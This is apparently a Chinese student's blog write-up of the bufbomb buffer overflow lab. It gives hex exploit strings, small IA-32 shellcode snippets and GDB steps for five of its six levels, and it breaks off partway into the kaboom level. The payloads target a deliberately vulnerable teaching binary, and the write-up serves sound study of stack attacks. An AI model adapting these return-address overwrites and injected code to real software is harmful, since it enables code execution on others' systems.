- [实验介绍](#实验介绍)
- [实验准备](#实验准备)
- [实验数据](#实验数据)
	- [目标程序 bufbomb 说明](#目标程序-bufbomb-说明)
	- [工具程序 hex2raw 说明](#工具程序-hex2raw-说明)
	- [工具程序 makecookie 说明](#工具程序-makecookie-说明)
- [测试攻击字符串](#测试攻击字符串)
- [实验内容](#实验内容)
	- [Level 0: smoke](#level-0-smoke)
	- [Level 1: fizz](#level-1-fizz)
	- [Level 2: bang](#level-2-bang)
	- [Level 3: rumble](#level-3-rumble)
	- [Level 4: boom](#level-4-boom)
	- [Level 5: kaboom](#level-5-kaboom)

# 实验介绍

本实验的目的在于加深对 IA-32 过程调用规则和栈结构的具体理解。实验的主要内容是对一个可执行程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该程序的运行内存映像（例如将专门设计的字节序列插入到栈中特定内存位置）和行为，以实现实验预定的目标。实验中你需要针对目标可执行程序 bufbomb，分别完成多个难度递增的缓冲区溢出攻击（完成的顺序没有固定要求）。按从易到难的顺序，这些难度级分别命名为 smoke (level 0)、fizz (level 1)、bang (level 2)、rumble (level 3)、boom (level 4) 和 kaboom (level 5)。 
>  1. 实验环境：Linux i386
>  2. 实验语言：汇编

# 实验准备

 1. **VScode（宇宙第一编辑器！）**
 2.  WSL下的Ubuntu22.04（虚拟机环境）
 3.  虚拟机安装i386
 4.  GDB调试环境 
 5. ~~作案工具和攻击代码~~ [(github)bufbomb相关工具以及实验代码](https://github.com/Pitous-a/buflab)
# 实验数据

在本实验中，每位学生应从下列链接下载包含本实验相关文件的一个 tar 文件： 
[http://cs.nju.edu.cn/sufeng/course/mooc/0809NJU064_buflab.tar](http://cs.nju.edu.cn/sufeng/course/mooc/0809NJU064_buflab.tar)

可在 Linux 实验环境中使用命令“tar xvf 0809NJU064_buflab.tar”将其中包含的文件提取到当前目录中。该 tar 文件中包含如下实验所需文件： 
 - **bufbomb**：实验需要攻击的目标 buffer bomb 程序
 - **makecookie**：该程序基于命令行参数给出的 ID，产生一个唯一的由 8 个 16 进制数字组成的字节序列（例如 0x1005b2b7），称为“cookie”，用作实验中可能需要置入栈中的数据之一
 - **hex2raw**：字符串格式转换程序

## 目标程序 bufbomb 说明

bufbomb 程序接受下列命令行参数： 

 - -u userid：以给定的用户 ID“userid”（本实验中应设为本慕课号“0809NJU064”） 运行程序。在每次运行程序时均应指定该参数，因为 bufbomb 程序将基于该 ID 决 定你应该使用的 cookie 值（与
   makecookie 程序的输出相同），而 bufbomb 程序 运行时的一些关键栈地址取决于该 cookie 值。

 - -h：打印可用命令行参数列表

 - -n：以“Nitro”模式运行，用于 kaboom 实验阶段

bufbomb 目标程序在运行时使用如下 getbuf 过程从标准输入读入一个字符串: 

```c
/* Buffer size for getbuf */ 
int getbuf() 
{ 
 other variables ...; 
 char buf[NORMAL_BUFFER_SIZE]; 
 Gets(buf); 
 return 1; 
} 
```

其中，过程 Gets 类似于标准库过程 gets，它从标准输入读入一个字符串（以换行‘\n’或文件结束 end-of-file 字符结尾)，并将字符串（以 null 空字符结尾）存入指定的目标内存位置。在 getbuf 过程代码中，目标内存位置是具有 NORMAL_BUFFER_SIZE 个字节存储空间的
数组 buf，而 NORMAL_BUFFER_SIZE 是大于等于 32 的一个常数。 
注意，过程 Gets()并不判断 buf 数组是否足够大而只是简单地向目标地址复制全部输入字符串，因此有可能超出预先分配的存储空间边界，即缓冲区溢出。如果用户输入给 getbuf()的字符串不超过(NORMAL_BUFFER_SIZE-1)个字符长度的话，很明显 getbuf()将正常返回 1，如下列运行示例所示： 

```c
linux>./bufbomb -u 123456789 
Type string: I love ICS. 
Dud: getbuf returned 0x1 
```

但是，如果输入一个更长的字符串，则可能会发生类似下列的错误： 

```c
Linux>./bufbomb -u 123456789 
Type string: It is easier to love this class when you are a TA. 
Ouch!: You caused a segmentation fault! 
```

正如上面的错误信息所指，缓冲区溢出通常导致程序状态被破坏，产生存储器访问错误。（思考：为什么会产生一个段错误？Linux x86 的栈结构组成是什么样的？） 

**本实验的任务就是精心设计输入给 bufbomb 的字符串，通过造成缓冲区溢出达成预定的实验目标，这样的字符串称为“exploit string”（攻击字符串），实验的关键是确定栈中哪些数据条目做为攻击的目标。** 

## 工具程序 hex2raw 说明

由于攻击字符串（exploit string）可能包含不属于 ASCII 可打印字符集合的字节取值，因而无法直接编辑输入。为此，实验提供了工具程序 hex2raw 帮助构造这样的字符串。该程序从标准输入接收一个采用十六进制格式编码的字符串（其中使用两个十六进制数字对攻击字符串中每一字节的值进行编码表示，不同目标字节的编码之间用空格或换行等空白字符分隔），进一步将输入的每对编码数字转为二进制数表示的单个目标字节并逐一送往标准输出。
注意，为方便理解攻击字符串的组成和内容，可以用换行分隔攻击字符串的编码表示中的不同部分，这并不会影响字符串的解释和转换。hex2raw 程序还支持 C 语言风格的块注释以便为攻击字符串添加注释（如下例），这同样不影响字符串的解释与使用。 

```c
bf 66 7b 32 78 /* mov $0x78327b66,%edi */ 
```

注意务必要在开始与结束注释字符串（“/*”和“*/”）前后保留空白字符，以便注释部分被
程序正确忽略。 
另外，注意： 

 - 攻击字符串中不能包含值为 0x0A 的字节，因为该字符对应换行符‘\n’，当 Gets
   过程遇到该字符时将认为该位置为字符串的结束，从而忽略其后的字符串内容
 - 由于 hex2raw 期望字节由两个十六进制格式的数字表示，因此如果想构造一个值 为 0 的字节，应指定 00

进一步，可将上述十六进制数字对序列形式的攻击字符串（例如“68 ef cd ab 00 83 c0 
11 98 ba dc fe”）保存于一文本文件中，用于测试等（见后面说明）。 

## 工具程序 makecookie 说明

如前所述，本实验部分阶段的正确解答基于从 bufbomb 命令行选项 userid（~~本实验中应设为本慕课号“0809NJU064”~~ 本实验中我将其设置为自己的学号）计算生成的 cookie 值。一个 cookie 是由 8 个 16 进制数字组成的一个字节序列（例如`0x1005b2b7`），对每一个 userid 是唯一的。可以如下使用makecookie 程序生成对应特定 userid 的 cookie，即将 userid 作为 makecookie 程序的唯一参数。 

```c
linux>./makecookie 0809NJU064 
0x420e0c1b 
0x420e0c1b 即为 0809NJU064 对应的 cookie 值。 
```

# 测试攻击字符串

可将攻击字符串保存在一文件 solution.txt 中，使用如下命令（将参数[userid]替换为本慕课号 0809NJU064）测试攻击字符串在bufbomb上的运行结果，并与相应难度级的期望输出对比，以验证相应实验阶段通过与否。 

```c
linux>cat solution.txt | ./hex2raw | ./bufbomb -u [userid] 
```

上述命令使用一系列管道操作符将程序 hex2raw 从编码字符串转换得到的目标攻击字节序列输入 bufbomb 程序中进行测试。 
除上述方式以外，还可以如下将攻击字符串的二进制字节序列存于一个文件中，并使用I/O 重定向将其输入给 bufbomb： 

```c
linux>./hex2raw < solution.txt > solution-raw.txt 
linux>./bufbomb -u [userid] < solution-raw.txt 
```

该方法也可用于在 GDB 中运行 bufbomb 的情况： 

```c
linux>gdb bufbomb 
(gdb) run -u [userid] < solution-raw.txt 
```

当你设计的攻击字符串成功完成了预定的缓冲区溢出攻击目标，例如实验 Level 0（smoke），程序将输出类似如下的信息，提示你的攻击字符串（此例中保存于文件 smoke.txt中）设计正确： 

```c
./hex2raw < smoke.txt | ./bufbomb -u 0809NJU064 
Userid: 0809NJU064 
Cookie: 0x420e0c1b 
Type string:Smoke!: You called smoke() 
VALID 
NICE JOB!
```
# 实验内容

> 注意：以下实验内容每个人产生的汇编语言和地址大小是不同的！

## Level 0: smoke

在 bufbomb 程序中，过程 getbuf 被一个 test 过程调用，代码如下： 

```c
void test() 
{ 
 int val; 
 /* Put canary on stack to detect possible corruption */ 
 volatile int local = uniqueval(); 
 
 val = getbuf(); 
 
 /* Check for corrupted stack */ 
 if (local != uniqueval()) { 
 printf("Sabotaged!: the stack has been corrupted\n"); 
 } 
 else if (val == cookie) { 
 printf("Boom!: getbuf returned 0x%x\n", val); 
 validate(3); 
 } else { 
 printf("Dud: getbuf returned 0x%x\n", val); 
 } 
} 
```

在 getbuf 过程执行完其返回语句后，程序正常情况下应该从上列 test 过程中第 8 行的if 语句继续执行，现在你应设法改变该行为。在bufbomb 程序中有一个对应如下 C 代码的过程 smoke： 

```c
void smoke() 
{ 
 printf("Smoke!: You called smoke()\n"); 
 validate(0); 
 exit(0); 
} 
```

本实验级别的任务是当 getbuf 过程执行它的 return 语句后，使 bufbomb 程序执行smoke 过程的代码，而不是返回到 test 过程继续执行。（注意：攻击字符串可能会同时破坏了与本阶段无关的栈结构部分，但在本级别中这没有问题，因为 smoke 过程会使程序直接结束） 

> 建议： 
>  - 在本级别中，用来推断攻击字符串的所有信息都可从检查 bufbomb 的反汇编代码中获得（使用 objdump –d 命令）
>  - 注意字符串和代码中的字节顺序
>  - 可使用 GDB 工具单步跟踪 getbuf 过程的最后几条指令，以了解程序的运行情况

 **解答**

 1. 将bufbomb可执行文件使用objdump进行反汇编`objdump -d bufbomb > bufbomb.d`
 2. 在bufbombd文件中找到getbuf函数
    ![请添加图片描述](https://img-blog.csdnimg.cn/92eea0bab9c74ead90aa920709ff2c3b.png)

    在这里我们可以看到其中的`lea -0x67(%ebp),%eax`指令的作用是指定缓冲区的大小，这里的`0x67`是16进制，所以缓冲区的大小就是103个字节。 
 3. 因为我们的目标是当 getbuf 过程执行它的 return 语句后，使 bufbomb 程序执行smoke过程的代码，所以我们需要覆盖掉getbuf栈帧的ret返回地址。找到smoke函数的入口地址为`0x080493d5`。
![请添加图片描述](https://img-blog.csdnimg.cn/246bba6ae7354c608ab56e10ee401409.png)
 4. 因为执行到getbuf时的栈帧中ebp+4存储的是test函数的ebp，而ebp+8为test的返回地址，所以我们需要在填满整个缓冲区后再覆盖掉8个字节，从而覆盖掉返回地址（小端存储）。

	`smoke.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00
	/* 覆盖test的ebp */
	00 00 00 00
	/* 覆盖返回地址 */
	d5 93 04 08
	```

 5. 最后执行命令`cat "./level0(smoke)/smoke.txt" | ./hex2raw | ./bufbomb -u 631907060609;`成功过关！
    
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/e7ad6ed480b648ed8da12f35f96c3c29.png)
## Level 1: fizz 
在 bufbomb 程序中有一个 fizz 过程，其代码如下： 

```c
void fizz(int val) 
{ 
 if (val == cookie) { 
 printf("Fizz!: You called fizz(0x%x)\n", val); 
 validate(1); 
 } else 
 printf("Misfire: You called fizz(0x%x)\n", val); 
 exit(0); 
} 
```

与 Level 0 类似，本实验级别的任务是让 bufbomb 程序在其中的 getbuf 过程执行 return语句后转而执行 fizz 过程的代码，而不是返回到 test 过程。不过，与 Level 0 的 smoke 过程不同，fizz 过程需要一个输入参数，如上列代码所示，本级别要求设法使该参数的值等于使用 makecookie 得到的 cookie 值。 

> 建议： 
> - 程序无需且不会真的调用 fizz——程序只是执行 fizz 过程的语句代码，因此需要仔细考虑将 cookie放置在栈中什么位置

**解答**

 1. 找到fizz函数的入口地址
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/57019347197f422aadadca1c4565f042.png)
    与level 0相似，攻击字符串需要将getbuf的ret返回地址覆盖为fizz函数的入口地址`0x08049402`
 2. 因为fizz的参数地址为`fizz的ebp+8`，而因为我们执行fizz是通过ret语句跳转执行，也就是在getbuf执行leave和ret后的栈帧为调用fizz的栈帧，所以`fizz的ebp+8`对应到getbuf中`103+4（test的ebp）+4（getbuf的ret）+4（fizz的ret）+4（fizz的参数）`，其中fizz的参数需要替换为cookie值（小端方式），可以使用`./makecookie 631907060609`查看， 我这里是`0x3b1a3827`。

	`fizz.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00
	/* 覆盖test的ebp */
	00 00 00 00
	/* 覆盖test返回地址(fizz入口) */
	02 94 04 08
	/* 覆盖fizz返回地址 */
	00 00 00 00
	/* cookie */
	27 38 1a 3b
	```

 3. 执行命令`cat "./level1(fizz)/fizz.txt" | ./hex2raw | ./bufbomb -u 631907060609;`成功过关！![在这里插入图片描述](https://img-blog.csdnimg.cn/c4f5605dc7b54dff8a0270b76b37fc8b.png)
## Level 2: bang 
更复杂的缓冲区攻击将在攻击字符串中包含实际的机器指令，并通过攻击字符串将原返回地址指针改写为位于栈上的攻击机器指令的开始地址。这样，当调用过程（这里是 getbuf）执行 ret 指令时，程序将开始执行攻击代码而不是返回上层过程。使用这种攻击方式可以使被攻击程序执行任何操作。随攻击字符串被放置到栈上的代码称为攻击代码（exploit code）。然而，此类攻击具有一定难度，因为必须设法将攻击机器代码置入栈中，并且将返回地址指向攻击代码的起始位置。 
在 bufbomb 程序中，有一个 bang 过程，代码如下： 
```c
int global_value = 0; 
void bang(int val) 
{ 
 if (global_value == cookie) { 
 printf("Bang!: You set global_value to 0x%x\n",global_value); 
 validate(2); 
 } else 
 printf("Misfire: global_value = 0x%x\n", global_value); 
 exit(0); 
}
```
与 Level 0 和 Level 1 类似，本实验级别的任务是让 bufbomb 执行 bang 过程中的代码而不是返回到 test 过程继续执行。具体来讲，攻击代码应首先将全局变量 global_value 设置为对应 userid（即本慕课号“0809NJU064”）的 cookie 值，再将 bang 过程的地址压入栈中，然后执行一条 ret 指令从而跳至 bang 过程的代码继续执行。 

> 建议：
>  - 可以使用 GDB 获得构造攻击字符串所需的信息。例如，在 getbuf    过程里设置一个断点并执行到该断点处，进而确定global_value 和缓冲区等变量的地址
>  - 手工进行指令的字节编码枯燥且容易出错。相反，你可以使用一些工具来完成该工作，具体可参考本文档最后的示例说明
>  - 不要试图利用 jmp 或者 call 指令跳到 bang 过程的代码中，这些指令使用相对    PC的寻址，很难正确达到前述目标。相反，你应向栈中压入地址并使用 ret 指令实现跳转

**解答**

 1. 要执行攻击代码，必须先确定`攻击代码的起始地址`。我们知道getbuf缓冲区的大小是103个字节，那么可以使用该`缓冲区的首地址`作为攻击代码的起始地址。要获取到缓冲区的起始地址，就需要使用GDB调试工具。![在这里插入图片描述](https://img-blog.csdnimg.cn/e2e7b43eb108432787a23a5e353ee3cd.png)
    > 这里使用VSCode的调试功能（需要安装C/C++扩展），配置`launch.json`文件，这里详细说明一下，后面也会用到。其中`program`配置的是你的bufbomb可执行文件路径。`args`是启动时的参数，这里的`"args":["-u","631907060609"]`就相当于执行`./bufbomb
    -u 631907060609`。`"MIMode":"gdb"`就是指定调试工具为gdb。这里的`set disassembly-flavor
    intel`是指定反汇编视图的汇编风格为Intel，默认情况是AT&T风格，这个看自己喜好，我就使用的默认AT&T汇编。
    
    在VSCode的调试功能指定断点为getbuf函数，然后在调用堆栈里打开反汇编视图（超赞!），在监视窗口添加表达式`$ebp-0x67`，可以看到`0x55682f29`就是缓冲区的首地址。![在这里插入图片描述](https://img-blog.csdnimg.cn/d256d5cb996c4728b87492dff0cb1529.png)
 2. 找到攻击代码的起始地址后，现在我们需要找到bang函数的入口地址和global_value的地址。
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/4ce4ca64af624f668839e998b2f2de0d.png)
    
    不难看出bang的入口地址为`0x08049453`，global_value对应的内存地址为`0x804d1a8`(对应printf函数的参数)。
 3. 现在我们需要构造一个攻击代码。 新建`attack.S`文件:

	```c
	movl $0x3b1a3827,0x804d1a8
	push $0x08049453
	ret
	```
    这段攻击代码的功能是:将`global_value`替换为cookie的值,并使函数跳转到bang函数。 然后使用命令
	```c
	gcc -m32 -c "./level2(bang)/attack.S" -o "./level2(bang)/attack.o";
	objdump -d "./level2(bang)/attack.o" > "./level2(bang)/attack.d";
	```
    将攻击代码反汇编，得到指令的机器码。 
   
   	 `attack.d`:
	```c
	./bang/attack.o:     file format elf32-i386
	Disassembly of section .text:
	00000000 <.text>:
	   0:	c7 05 a8 d1 04 08 27 	movl   $0x3b1a3827,0x804d1a8
	   7:	38 1a 3b
	   a:	68 53 94 04 08       	push   $0x8049453
	   f:	c3                   	ret    
	```

 4. 将得到的机器码写入缓冲区中，将返回地址覆盖为缓冲区数组的起始地址（仍然使用小端方式）。

	`bang.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	c7 05 a8 d1 04 08 27 38 1a 3b
	68 53 94 04 08 c3 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00
	/* 覆盖test的ebp */
	00 00 00 00
	/* 覆盖test返回地址(buf入口) */
	29 2f 68 55
	```
    最后执行命令`cat "./level2(bang)/bang.txt" | ./hex2raw | ./bufbomb -u
    631907060609;`成功过关！
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/dfc5dce756fc41a3a6d6debc76679d52.png)

## Level 3: rumble 
与前一级别相同，本级别实验需要在攻击字符串中包含实际的机器指令以实现改写原返回地址指针、执行特定的攻击行为等目标。与前一级别不同之处是，本级别需要在攻击字符串中包含准备和传递过程调用参数的指令，注意所传递参数与攻击字符串一样将占用栈中的存储空间。 
在 bufbomb 程序中，有一个 rumble 过程，代码如下： 

```c
void rumble(char *str) 
{ 
 if (eval2equal(str, cookie)) { 
 printf("Rumble!: You called rumble(\"%s\")\n", str); 
 validate(3); 
 } else 
 printf("Misfire: You called rumble(\"%s\")\n", str); 
 exit(0); 
} 
```

该过程将进一步调用一个原型为”int eval2equal(char *strval, unsigned val)“的过程，并当 eval2equal 过程的返回值为真时，提示正确地通过了本实验级别。与前面级别类似，本实验级别的任务是让 bufbomb 执行 rumble 过程中的代码而不是返回到 test 过程继续执行。具体来讲，攻击代码应首先在栈上准备正确的调用参数，再将rumble 过程的地址压入栈中，然后执行一条 ret 指令从而跳至 rumble 过程的代码继续执行。 

> 建议：
>  - 可以使用 OBJDUMP 工具分析被调用过程 eval2equal    的执行逻辑（可集中注意力于自`sprintf`过程调用及其参数压栈开始的指令，其前的多数指令与随机数的生成和使用有关——与本实验级别的主要目的关系不大），以获得传递参数的正确取值，从而构造满足实验目标的攻击字符串
>  - 如前一级别实验，你可以使用一些工具来帮助进行指令的字节编码（可参考本文档最后的示例说明），并通过向栈中压入地址并使用 ret    指令来实现跳转
>  - 在栈中合理安排调用参数的值的存储空间

**解答**

 1. 我们需要做的是存放一个str字符串，让rumble过程的`eval2equal(str,cookie)`为true，进入rumble的方法与bang是一样的，只需要先覆盖test的返回地址为缓冲区的入口地址，然后在攻击代码中先push一下rumble的入口地址，再ret即可。但是eval2equal函数的功能目前尚不明确，因此需要一边调试一边分析。（重点分析`sprintf`和`memcmp`函数）
![在这里插入图片描述](https://img-blog.csdnimg.cn/4896e11c09ad4f1a9cf1b5075dc675bc.png)
 2. 在bufbomb.d中找到rumble函数的入口地址
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/623fa7b5917f4cd884efff68b3e7b375.png)
 3. 然后构造一个进入rumble函数的攻击代码
	
	`attack.S`:

	```c
	push $0x1
	subl $0x4, %esp
	push $0x08049514
	ret
	```
	

	> 其中$0x1是str的首地址，注意这里str的首地址是rumble的ebp+8，因为是通过ret语句进入缓冲区的，所以在执行攻击代码的时候的栈帧已经是没有test的返回地址和test的ebp的(已经弹出了)，所以rumble的ebp+8对应缓冲区103+8+8的位置，需要先将str入栈，再将栈顶指针esp-4(也可以用push指令压入一个值)覆盖103+8+4的位置。

 4. 执行命令
	```c
	gcc -m32 -c "./level3(rumble)/attack.S" -o "./level3(rumble)/attack.o";
	objdump -d "./level3(rumble)/attack.o" > "./level3(rumble)/attack.d";
	```
	将攻击代码转为机器码
	
	`attack.d`:
	```c
	./level3(rumble)/attack.o:     file format elf32-i386
	Disassembly of section .text:
	00000000 <.text>:
	   0:	6a 01                	push   $0x1
	   2:	83 ec 04             	sub    $0x4,%esp
	   5:	68 14 95 04 08       	push   $0x8049514
	   a:	c3                   	ret    
	```
 5. 攻击代码的起始地址与bang过程一样，依然是缓冲区的起始地址`0x55682f29`，将机器码和其写入攻击字符串中。
        ![在这里插入图片描述](https://img-blog.csdnimg.cn/9207ebf8866a4df7b56485d305c8f41a.png)

    执行命令`./hex2raw < "./level3(rumble)/rumble.txt" >
    "./level3(rumble)/rumble-row.txt";`将攻击字符串的二进制字节序列存于`rumble-row.txt`中。
 6. 然后配置GDB调试文件`launch.json`![在这里插入图片描述](https://img-blog.csdnimg.cn/61bde6ded5084745a592ca1788dcd269.png)
在eval2equal的sprintf和memcmp前打断点。可以看出sprintf的功能是将cookie转为字符串，memcmp是将cookie字符串和str比较，因为我们需要使str字符串与cookie字符串相等。
![在这里插入图片描述](https://img-blog.csdnimg.cn/0a144cead0d44901841b8c2f436ff614.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/37d816c912a94fa1a779dddb65143bce.png)
我们需要cookie字符串的16进制数据，点击图标，即可查看cookie字符串对应的16进制数据为`33 42 31 41 33 38 32 37`。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c688240d4602458a925315e361ac19bf.png)

 7. 这里我将数据保存在缓冲区中，str的首地址为缓冲区的首地址(0x55682f29)加上103减去8，计算可得str的首地址为`0x55682f88`。
   
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/06793838cf7047099c7558c9e49758ac.png)
	
	修改`attack.S`:
	
	```c
	push $0x55682f88
	subl $0x4,%esp
	push $0x08049514
	ret
	```
	
	还是依然执行命令：
	```c
	gcc -m32 -c "./level3(rumble)/attack.S" -o "./level3(rumble)/attack.o";
	objdump -d "./level3(rumble)/attack.o" > "./level3(rumble)/attack.d";
	```
	修改`rumble.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	68 88 2f 68 55 83 ec 04 68 14
	95 04 08 c3 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 33 42 31 41 33
	38 32 37
	/* 覆盖test的ebp */
	00 00 00 00
	/* 覆盖test返回地址(buf入口) */
	29 2f 68 55
	```
	执行命令:
	```c
	./hex2raw < "./level3(rumble)/rumble.txt" > "./level3(rumble)/rumble-row.txt";
	./bufbomb -u 631907060609 < "./level3(rumble)/rumble-row.txt";
	```

 8. 不知道你们成功没有，我反正没成功。哈哈。Misfire就是失败了。
    	![在这里插入图片描述](https://img-blog.csdnimg.cn/58f975bdd6d5411a91baed5e643f721a.png)
	
	因为这个字符串只有前半部分，排查了一下原因，可能是后半部分的内存地址在getbuf过程覆盖后又被其他代码更改了。所以我就索性把字符串往前挪了4个字节。将str首地址改为0x55682f88-0x4=0x55682f84,并重新修改了attack.S和rumble.txt，流程跟上面是一样的，这里只把`attack.S`和`rumble.txt`给出来。
	
	`attack.S`:
	```c
	push $0x55682f84
	subl $0x4,%esp
	push $0x08049514
	ret
	```
	
	`rumble.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	68 84 2f 68 55 83 ec 04 68 14
	95 04 08 c3 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 33 42 31 41 33 38 32 37 00
	00 00 00
	/* 覆盖test的ebp */
	00 00 00 00
	/* 覆盖test返回地址(buf入口) */
	29 2f 68 55
	```
	![在这里插入图片描述](https://img-blog.csdnimg.cn/54dc4ccae79e4b7a822aa704d7d7d9cf.png)
	成功过关！
## Level 4: boom
本实验的前几个级别实现的攻击都是使得程序跳转到不同于正常返回地址的其他过程中，进而结束整个程序的运行。因此，使用攻击字符串破坏、改写栈中原来保存的值的方式是可接受的。然而，更高明的缓冲区溢出攻击除执行攻击代码来改变程序的寄存器或内存中的值外，还设法使程序能够返回到原来的调用过程（例如 test）继续执行——即调用过程感觉不到攻击行为。然而，这种攻击方式的难度相对更高，因为攻击者必须： 
1. 将攻击机器代码置入栈中
2. 设置 return 指针指向该代码的起始地址
3. 还原（清除）对栈状态的破坏

本实验级别的任务是构造一个攻击字符串，使得 getbuf 过程将 cookie 值返回给 test 过程，而不是返回值 1。除此之外，攻击代码应还原必要但被破坏的栈状态，将正确返回地址压入栈中，并执行 ret 指令从而真正返回到 test 过程。 

> 建议：  同上一级别，例如可使用 GDB 确定保存的返回地址等参数

**解答**

 1. 通过反汇编可以查看getbuf的返回地址为`0x8049584`,同时可以看出getbuf返回的值被保存在了寄存器eax中，所以我们的攻击代码应该将cookie放到eax里。
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/241b710de8464a4ba9985d51b6013fb7.png)
 2. 攻击代码的内容只需要把cookie值放入eax，然后返回到getbuf的下条指令继续执行即可。
	
	 `attack.S`:
	```c
	movl $0x3b1a3827,%eax
	push $0x8049584
	ret
	```
 3. 此外还需要把test过程的ebp保存在栈帧中,按类似bang过程的配置完`luanch.json`后，进入GDB调试，在test过程打个断点，可以获取test过程的ebp为`0x55682fb0`(记得要点击调用堆栈的test)
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/d787a8b6cff844949b5ca8d0499911f9.png)
 4. 将攻击代码反汇编后放到boom.txt里，并将ebp覆盖为test的ebp(其实就是没有覆盖) 
	
	`boom.txt`:
	```c
	/*  103个字节对应0x67的空间大小  */
	b8 27 38 1a 3b 68 84 95 04 08
	c3 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00
	/* 覆盖test的ebp */
	b0 2f 68 55
	/* 覆盖test返回地址(buf入口) */
	29 2f 68 55
	```
 5. 执行命令:
	```c
	./hex2raw < "./level4(boom)/boom.txt" > "./level4(boom)/boom-row.txt";
	./bufbomb -u 631907060609 < "./level4(boom)/boom-row.txt";
	```
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/b5a44cf7e1b545e586968f262edca8a3.png)
    成功过关！
## Level 5: kaboom 

> 注意：要进行本级别实验，运行 bufbomb 程序（以及 hex2raw程序）时必须加上“-n”命令行选项，从而使程序进入"Nitro"模式。

通常，一个过程的栈帧的确切内存地址随程序运行实例（特别是运行用户）的不同而不同。其中一个原因是当程序开始执行时，所有环境变量的字符串形式的值存储在栈中接近栈基地址的内存位置中，视环境变量字符串的不同占用不同数量的存储空间。因此，为一特定运行用户分配的栈空间取决于其环境变量的设置。此外，当在 GDB 中运行程序时，程序的栈地址也会存在差异，因为 GDB 使用栈空间保存自己的状态。 
之前级别的实验中通过一定措施获得了稳定的栈地址，因此不同运行实例中，getbuf 过程的栈帧地址保持不变。这使得在之前实验中能够基于 buf 的已知确切起始地址构造攻击字符串。但是，如果尝试将这样的攻击用于一般的程序，你会发现攻击有时奏效，有时却导致段错误（segmentation fault）。 
**不同于之前级别，本实验级别（”Nitro”）中栈帧的地址不再固定————程序在调用 testn 过程前会在栈上分配一随机大小的内存块，因此 testn 过程及其所调用的 getbufn过程的栈帧起始地址在每次运行程序时是一个随机、不固定的值。**
另一方面，在该模式下程序调用的 getbufn 过程区别于 getbuf 过程之处在于——getbufn 过程使用的缓冲区长度在 512 字节以上，以方便你利用更大的存储空间构造可靠的攻击代码： 
```c
/* Buffer size for getbufn */ 
#define KABOOM_BUFFER_SIZE 一个大于等于 512 的整数常量
```
本级别实验的任务与前一级别相同，即构造一攻击字符串使得 getbufn 过程返回 cookie值至 testn 过程，而不是返回值 1。具体来说，攻击字符串应将过程返回值设为 cookie 值，复原/清除所有被破坏的状态，将正确的返回位置压入栈中，并执行 ret 指令以返回 testn 过
程。然而，在 Nitro 模式下运行时，bufbomb 使用输入的同一攻击字符串连续执行5次 getbufn过程，每次采用不同的栈偏移位置，而攻击字符串必须使程序每次均能返回 cookie 值。 

> 建议： 
>  1. 本实验的技巧在于合理使用 nop 指令，该指令的机器代码只有一个字节（0x90）
>  2. 可以如下使用 hex2raw 程序生成并传送攻击字符串的多个拷贝给 bufbomb 程序 （假设 kaboom.txt 文件中保存了攻击字符串的一个拷贝）：`linux>cat kaboom.txt | ./hex2raw -n | ./bufbomb -n -u 0809NJU064`

**解答**

 1. 先查看getbufn函数的反汇编代码，并重新修改缓冲区大小。
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/a8eb02ab4a254564a47173178f44cafe.png)

 2. 配置`luanch.json`文件时记得加上-n命令:
    
    ```c 
    		{
                "name": "kaboom",
                "type": "cppdbg",
                "request": "launch",
                "program": "${workspaceRoot}/bufbomb",
